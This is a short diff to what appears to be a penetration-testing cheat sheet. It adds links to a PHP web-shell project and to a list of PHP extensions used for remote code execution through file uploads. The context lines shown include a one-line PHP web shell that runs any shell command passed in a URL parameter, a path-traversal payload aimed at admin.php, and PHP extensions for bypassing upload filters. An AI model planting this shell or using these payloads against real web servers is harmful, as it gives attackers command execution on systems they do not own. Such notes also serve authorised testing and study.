@@ -20,6 +20,7 @@
 ```
 ---
 # php 
+https://github.com/Arrexel/phpbash
 ## rce
 ```
 <?php echo "$ ";system($_GET['cmd']); ?>
@@ -48,6 +49,7 @@ page=asd/../admin.php/./././././././././././././././././././././././././././././
 ```
 ---
 ## php extensions to run RCE
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst
 ```
 .php
 .php3
